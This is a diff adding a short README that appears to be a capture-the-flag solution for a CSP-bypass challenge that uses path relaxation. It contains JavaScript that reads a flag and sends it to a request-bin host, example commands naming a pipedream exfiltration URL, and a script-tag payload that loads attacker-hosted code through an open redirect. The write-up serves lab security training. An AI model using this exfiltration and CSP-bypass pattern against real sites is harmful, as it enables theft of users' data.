@@ -1,0 +1,25 @@
+# CSP Three
+Bypass the CSP using **path relaxation**.
+
+For this challenge you need to read the flag, you can use XHR. The script needs to be hosted on GCS: 
+```
+var xhr = new XMLHttpRequest();    
+xhr.open('GET', 'http://[$CHALLENGE_IP]/csp-three-flag', true);
+xhr.onload = function () {
+var request = new XMLHttpRequest();
+request.open('GET', 'http://[$REQUEST_BIN_URI]?flag='+xhr.responseText, true);
+request.send()
+};
+xhr.send(null);
+```
+
+You can create the script using solution.py and upload it to a GCS bucket, 
+```
+python solution.py [$CHALLENGE_URL] [$REQUEST_BIN_URL] [$BUCKET_NAME]
+python solution.py http://192.168.86.180:8000 http://endiel6lj35l8.x.pipedream.net http://storageapis.com/bucketname
+```
+
+Payload will be,
+```
+<script src="http://[$CHALLENGE_URL]:8000/redirect?url=http://storage.googleapis.com/[$BUCKET_NAME]/payload.js"></script>
+```
